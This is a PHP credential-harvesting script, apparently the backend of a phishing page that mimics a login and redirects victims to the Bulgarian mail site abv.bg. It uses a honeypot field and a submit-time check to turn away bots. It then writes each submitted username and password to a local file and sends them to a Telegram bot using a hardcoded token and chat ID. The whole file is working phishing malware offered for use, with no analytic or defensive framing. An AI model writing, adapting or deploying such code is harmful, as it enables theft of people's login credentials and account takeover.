<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the submitted data
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    $honeypot = $_POST['honeypot'] ?? ''; // Honeypot field
    $startTime = $_POST['startTime'] ?? 0; // Time when form was rendered
    $submitTime = time() * 1000; // Current time (in milliseconds)
    $elapsedTime = $submitTime - $startTime; // Calculate time taken to submit the form

    // Check honeypot - if filled, assume bot
    if (!empty($honeypot)) {
        header("Location: https://abv.bg");
        exit();
    }

    // Check time - if too quick (e.g., less than 3 seconds), assume bot
    if ($elapsedTime < 3000) {
        header("Location: https://abv.bg");
        exit();
    }

    // Continue with your existing code for saving credentials and sending to Telegram
    if (!empty($username) && !empty($password)) {
        // Save credentials to a local file
        $file_path = __DIR__ . "/credentials.txt";
        $file = fopen($file_path, "a");

        if ($file) {
            fwrite($file, "Username: " . $username . "\n");
            fwrite($file, "Password: " . $password . "\n");
            fwrite($file, "--------------------\n");
            fclose($file);
        }

        // Send credentials to Telegram
        $botToken = "7015141193:AAEsMV5XoRD17RtjizOtVUpXVXbBYiAFVi0"; // Replace with your actual bot token
        $chatId = "1837776273"; // Replace with your actual chat ID
        $message = "Username: $username\nPassword: $password";
        $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);

        // Send request to Telegram API
        file_get_contents($url);

        // Redirect after successful submission
        header("Location: https://abv.bg");
        exit();
    } else {
        // Redirect if credentials are empty
        header("Location: https://abv.bg");
        exit();
    }
}
?>
